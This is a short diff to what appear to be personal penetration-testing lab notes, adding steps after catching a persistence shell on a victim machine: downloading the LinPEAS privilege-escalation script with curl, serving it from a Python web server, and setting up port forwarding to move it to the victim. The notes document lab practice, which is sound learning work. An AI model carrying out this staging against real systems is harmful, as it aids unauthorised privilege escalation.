@@ -72,9 +72,14 @@ catch user persistence shell ON VIC2 [[14:02]]DAY 12
 
 (ATTACKER) (NEW TERM) CAT INTERNAL AND CD TO 192.168.1.102
 
-next step [1:33][DAY 12]
+(ATTACKER) curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh [1:33][DAY 12]
 
+(ATTACKER) curl -L http://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee linpeas.sh
 
+(ATTACKER) ls [this is a automation script that we will move to the victim] this info could be found on hacktricks
+(Checklist Linux Privesc escalation LinPEAS)
 
+(ATTACKER) python3 -m http.server 8000
 
+set up another port fowarding rule with this port number because thats where the websever is.
 
